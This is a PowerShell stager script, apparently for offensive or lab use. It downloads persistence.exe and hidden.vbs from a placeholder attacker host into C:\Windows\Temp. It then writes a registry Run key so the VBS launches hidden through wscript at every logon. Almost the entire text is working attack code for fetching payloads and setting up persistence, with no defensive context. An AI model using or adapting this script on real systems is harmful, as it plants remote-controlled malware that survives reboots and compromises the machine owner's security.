# Disable progress bar to speed up downloads
$ProgressPreference = "SilentlyContinue"

# Download persistence.exe
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile("http://<Attacker's IP>/persistence.exe", "C:\Windows\Temp\persistence.exe")
    $webClient.Dispose()
}
catch {
    # If download fails, exit without continuing
    exit
}

# Download hidden.vbs (only executes if persistence.exe download succeeded)
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile("http://<Attacker's IP/hidden.vbs", "C:\Windows\Temp\hidden.vbs")
    $webClient.Dispose()
}
catch {
    # If download fails, exit without continuing
    exit
}

# Create registry entry (only executes if both downloads succeeded)
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'persistence' -Value "wscript.exe C:\Windows\Temp\hidden.vbs" -PropertyType String -Force
